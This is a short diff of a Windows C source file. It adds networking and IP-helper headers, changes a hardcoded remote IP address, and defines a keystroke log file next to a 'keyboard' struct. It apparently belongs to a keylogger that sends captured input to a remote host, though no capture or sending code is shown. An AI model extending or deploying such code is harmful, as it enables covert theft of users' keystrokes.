@@ -6,11 +6,15 @@
 #include <time.h>
 #include <io.h>
 #include <WS2tcpip.h>
+#include <IPHlpApi.h>
+#include <rpc.h>
+
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment (lib, "IPHLPAPI.lib")
 #define BUFFSIZE 1024
 #define LOGFILE		L"C:\\test.txt"
-#define IP "10.224.55.165"
+#define IP "10.224.56.125"
 
 struct keyboard
 {
